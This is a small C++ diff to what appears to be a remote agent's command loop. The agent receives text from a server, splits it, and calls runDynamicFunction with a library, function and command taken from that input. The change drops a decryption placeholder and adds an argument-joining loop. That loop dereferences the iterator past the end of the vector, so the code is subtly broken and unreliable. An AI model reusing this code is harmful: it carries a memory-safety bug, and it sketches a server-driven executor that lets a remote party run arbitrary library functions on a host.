@@ -150,7 +150,7 @@ void Agent::GetRequestFromServer()
 		SendMessageToServer(m.c_str(), m.size());
 		ReciveMessage();
 
-		vector<string> res = split("TODO: decrypt");
+		vector<string> res = split(string(recvbuf));
 		vector<string>::iterator it = res.begin();
 
 		// Take action from command
@@ -169,6 +169,10 @@ void Agent::GetRequestFromServer()
 				string library = *it;
 				string func = *(++it);
 				string cmd = *(++it);
+				while (it != res.end())
+				{
+					cmd.append(*(++it));
+				}
 				runDynamicFunction(library, func, cmd);
 			}
 		}
